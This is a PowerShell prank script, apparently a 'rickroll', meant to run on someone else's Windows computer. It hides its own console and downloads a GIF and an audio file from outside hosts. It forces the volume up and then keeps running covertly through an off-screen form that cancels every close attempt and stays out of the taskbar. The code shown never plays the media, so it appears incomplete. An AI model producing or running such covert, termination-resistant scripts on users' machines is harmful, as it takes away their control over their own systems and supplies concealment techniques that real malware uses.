Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Hide PowerShell console window immediately
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
$consolePtr = [Win32]::GetConsoleWindow()
[Win32]::ShowWindow($consolePtr, 0)  # Hide the console window

# Paths for temporary files
$gifPath = "$env:TEMP\rickroll.gif"
$mp3Path = "$env:TEMP\sound.mp3"

# Download GIF and MP3 if missing (optional)
if (-not (Test-Path $gifPath)) {
    Invoke-WebRequest -Uri "https://media.tenor.com/onTlUVMtWy4AAAAM/rickroll-rick.gif" -OutFile $gifPath -UseBasicParsing
}

if (-not (Test-Path $mp3Path)) {
    Invoke-WebRequest -Uri "https://audio.jukehost.co.uk/gW1i5EkMPBjmlK0bZrsBhIsfWDSLgjCX" -OutFile $mp3Path -UseBasicParsing
}

# Increase volume (optional)
$wshell = New-Object -ComObject wscript.shell
for ($i=0; $i -lt 50; $i++) {
    $wshell.SendKeys([char]175)  # VK_VOLUME_UP
    Start-Sleep -Milliseconds 20
}

# Create a non-closable, invisible form to prevent user interaction
$form = New-Object System.Windows.Forms.Form
$form.Text = "Hidden Window"
$form.Size = [System.Drawing.Size]::new(1, 1)
$form.StartPosition = "Manual"
$form.Location = [System.Drawing.Point]::new(-3000, -3000)  # Place off-screen

# Prevent closing via Alt-F4 or close button
$form.Add_FormClosing({
    param($sender, $e)
    $e.Cancel = $true  # Block all closure attempts
})

# Ensure the form is not visible in Task Manager or Alt-Tab list
$form.ShowInTaskbar = $false
$form.TopMost = $true

# Show the form (invisible to user but prevents script from exiting)
$form.Show()

# Prevent script from closing by keeping it running indefinitely
while ($true) {
    Start-Sleep -Seconds 1
}
